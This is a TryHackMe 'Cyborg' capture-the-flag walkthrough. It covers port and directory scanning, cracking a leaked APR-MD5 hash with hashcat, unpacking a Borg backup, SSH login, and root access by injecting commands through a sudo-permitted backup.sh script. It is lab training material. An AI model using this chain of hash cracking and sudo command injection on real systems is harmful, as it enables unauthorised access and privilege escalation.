# TRYHACKME – Cyborg (CTF)

![Cyborg.png](Cyborg.png)

Use nmap tool to scan target ports

**`nmap 10.10.23.140`**

![nmap-scan#1.png](nmap-scan1.png)

Port: Services:

22     ssh (Secure Shell)

80     http (Hypertext Transfer Protocol)

Use gobuster tool to brute-force directories on web servers

`gobuster dir -u http://10.10.23.140 -w /usr/share/seclists/Discovery/Web-Content/common.txt`

> dir –> to search for directories

> -u –> specify the URL

> -w –> path to the worldlist

![gobuster-scan#1.png](gobuster-scan1.png)

Directories found:

/admin

/etc

![etc-dir#1.png](etc-dir1.png)

![etc-squid-dir#1.png](etc-squid-dir1.png)

![md5-hash#1.png](md5-hash1.png)

**Identify the hash type**

**`hash-identifier`** 

**> hash** –> **$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.**

![hash-identifier#1.png](hash-identifier1.png)

**hash type: md5(APR)**

Crack hash using hashcat tool

**`hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`**

> -m –> specifies the hash type (1600 – md5 APR)

> -a –> specifies the attack mode (0 – brute force)

![hashcat#1.png](hashcat1.png)

![admin-index-page-file#1.png](admin-index-page-file1.png)

Unzip the file

**`tar –xf archive.tar`**

> -xf –> used to extract .rar files

![list-zip-file#1.png](list-zip-file1.png)

![unzip-tar-file#1.png](unzip-tar-file1.png)

**`cat README`**

Give as a hint to search for BorgBackup tool

Download borgbackup tool

**`apt install borgbackup –y`**

Extract files with borg

**`sudo borg extract Downloads/home/field/dev/final_archive::music_archive`**

Use the previous cracked  password

**`cat note.txt`**

![cat-file#1.png](cat-file1.png)

Connect to the target machine via ssh

**`ssh alex@10.10.159.75`**

![ssh#1.png](ssh1.png)

**`cat user.txt`**

![cat-file#2.png](cat-file2.png)

List the user privileges to see what we can do with this user

**`sudo -l`**

![list-user-privileges#1.png](list-user-privileges1.png)

alex can run this script as “sudo”

`cd /etc/mp3backups`

![mv-dir-mp3backups#1.png](mv-dir-mp3backups1.png)

**`cat backup.sh`**

![cat-file#3.png](cat-file3.png)

Optional arguments can be passed through this instruction (OPTARG) 

List directories on root

**`sudo ./backup.sh -c “ls /root”`**

> -c –> pass a command

![run-file-arguments#1.png](run-file-arguments1.png)

**`sudo ./backup.sh -c “cat /root/root.txt”`**

![run-file-aguments#2.png](run-file-aguments2.png)
